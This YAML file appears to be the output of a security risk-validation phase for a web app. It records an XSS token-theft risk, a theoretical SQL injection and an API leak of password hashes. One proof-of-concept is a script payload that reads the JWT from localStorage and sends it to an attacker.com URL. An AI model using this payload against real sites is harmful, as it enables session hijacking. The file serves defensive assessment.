P6_validated_risks:
  risk_details:
    - id: R-001
      threat_ref: T-001
      verification_status: verified
      poc_available: true
      severity_final: HIGH
      description: XSS attack can steal JWT token from localStorage
      evidence: Simulated XSS payload successfully extracts token
    - id: R-002
      threat_ref: T-002
      verification_status: theoretical
      poc_available: false
      severity_final: MEDIUM
      description: SQL injection theoretically possible but requires auth bypass
      evidence: Code analysis shows parameterized queries used
    - id: R-003
      threat_ref: T-003
      verification_status: verified
      poc_available: true
      severity_final: MEDIUM
      description: API returns excessive user data including internal fields
      evidence: Response includes passwordHash in user object
  
  poc_details:
    - id: POC-001
      risk_ref: R-001
      type: XSS
      steps:
        - Inject script tag via unsanitized input
        - Script reads localStorage.getItem('token')
        - Token sent to attacker server
      proof_of_concept: "<script>fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))</script>"
    - id: POC-003
      risk_ref: R-003
      type: Information Disclosure
      steps:
        - Call GET /api/users endpoint
        - Response includes passwordHash field
      proof_of_concept: "curl -H 'Authorization: Bearer {token}' /api/users"
  
  risk_summary:
    verified: 2
    theoretical: 1
    pending: 0
    excluded: 1